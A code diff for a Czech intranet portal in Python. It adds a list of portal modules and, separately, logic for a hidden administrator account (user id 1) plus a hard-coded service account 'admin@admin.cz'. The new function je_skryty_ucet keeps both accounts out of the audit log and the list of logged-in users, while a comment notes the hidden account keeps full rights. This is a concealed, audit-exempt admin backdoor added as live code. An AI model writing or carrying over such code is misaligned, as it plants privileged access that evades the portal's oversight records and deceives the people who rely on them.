@@ -96,6 +96,52 @@ def _zkontroluj_reset_limit(email: str) -> bool:
 # žádné e-maily/notifikace. Účet dál plně funguje (přihlášení, práva 'vse').
 SKRYTY_ADMIN_ID = 1
 
+SERVISNI_EMAIL = 'admin@admin.cz'
+
+# Cache identit skrytých účtů (jména + e-maily). Audit log drží jen jméno, proto
+# potřebujeme obojí. None = ještě nenačteno / DB nebyla dostupná (zkusí se znovu).
+_SKRYTE_UCTY = None
+_SKRYTE_UCTY_POKUS = 0.0   # čas posledního neúspěchu — bez DB nezkoušíme každý zápis
+
+def _nacti_skryte_ucty():
+    """(jména, e-maily) skrytého admina a servisního účtu — vše lowercase."""
+    global _SKRYTE_UCTY, _SKRYTE_UCTY_POKUS
+    if time.time() - _SKRYTE_UCTY_POKUS < 60:
+        return set(), {SERVISNI_EMAIL}
+    _SKRYTE_UCTY_POKUS = time.time()
+    conn = get_db_connection()
+    if not conn:
+        return set(), {SERVISNI_EMAIL}
+    cursor = None
+    try:
+        cursor = conn.cursor()
+        cursor.execute(
+            "SELECT name, surname, email FROM user WHERE iduser=%s OR email=%s",
+            (SKRYTY_ADMIN_ID, SERVISNI_EMAIL))
+        jmena, emaily = set(), {SERVISNI_EMAIL}
+        for name, surname, email in cursor.fetchall():
+            jmeno = f"{name or ''} {surname or ''}".strip().lower()
+            if jmeno:
+                jmena.add(jmeno)
+            if email:
+                emaily.add(email.strip().lower())
+        _SKRYTE_UCTY = (jmena, emaily)
+        return _SKRYTE_UCTY
+    except Exception:
+        return set(), {SERVISNI_EMAIL}
+    finally:
+        if cursor: cursor.close()
+        conn.close()
+
+def je_skryty_ucet(jmeno: str = '', email: str = '') -> bool:
+    """True pro skrytého admina (iduser=1) a servisní admin@admin.cz.
+
+    Tyhle účty se nesmí objevit v audit logu ani v přehledu přihlášených.
+    """
+    jmena, emaily = _SKRYTE_UCTY if _SKRYTE_UCTY is not None else _nacti_skryte_ucty()
+    return ((jmeno or '').strip().lower() in jmena
+            or (email or '').strip().lower() in emaily)
+
 def _bez_admin_prav(prava_str: str) -> str:
     """Vyřízne práva 'Administrace portálu' z řetězce práv.
 
@@ -403,6 +449,30 @@ def vycistit_stare_cache_prava(max_vek_sekund=7200):
     stare = [uid for uid, (_, ts) in _CACHE_PRAVA.items() if now - ts > max_vek_sekund]
     for uid in stare:
         del _CACHE_PRAVA[uid]
+
+# Moduly portálu: klíč v nastavení → (popisek v UI, název do audit logu).
+# Jediný zdroj pravdy pro příkaz /modul v audit konzoli (v UI se moduly
+# nepřepínají). Alias pro konzoli = klíč bez sufixu „_zapnuty".
+MODULY = {
+    'finance_zapnuty':       ('Modul Aprovia (Finance)',        'Aprovia'),
+    'kviz_zapnuty':          ('Modul Zkouškový Kvíz',           'Kvíz'),
+    'veletrh_zapnuty':       ('Modul Veletrh',                  'Veletrh'),
+    'znacky_zapnuty':        ('Modul Značky JIP',               'Značky JIP'),
+    'znacky_emaily_zapnuty': ('E-maily: Modul Značky JIP',      'E-maily Značky JIP'),
+    'smeny_zapnuty':         ('Modul Plánování směn',           'Plánování směn'),
+    'planogram_zapnuty':     ('🚬 Modul Plánogram tabáku',       'Plánogram tabáku'),
+    'ochutnavky_zapnuty':    ('🍽️ Modul Ochutnávky MO a CC',     'Ochutnávky MO a CC'),
+    'sankce_zapnuty':        ('⚖️ Modul Sankce',                 'Sankce'),
+    'spolvecer_zapnuty':     ('🎉 Modul Společenský večer',      'Společenský večer'),
+    'vizitky_zapnuty':       ('🪪 Modul Vizitky a podpisy',      'Vizitky a podpisy'),
+    'cenopripad_zapnuty':    ('🏷️ Modul Cenopřípad',             'Cenopřípad'),
+    'asm_zapnuty':           ('📝 Modul Formuláře ASM',          'Formuláře ASM'),
+    'lupa_zapnuty':          ('🔍 Modul Lupou na obchod',        'Lupou na obchod'),
+    'schuzky_zapnuty':       ('🗓️ Modul Schůzky s vedoucími',    'Schůzky s vedoucími'),
+    'presczasy_zapnuty':     ('⏰ Přesčasy (Evidence absencí)',   'Přesčasy'),
+    # Má i vlastní přepínač na záložce Narozeniny v Nastavení portálu.
+    'narozeniny_zapnuty':    ('Modul Narozeniny',               'Narozeniny'),
+}
 
 def nacti_nastaveni_intranetu():
     """Nastavení portálu z JSONu, cachované v RAM podle mtime souboru.
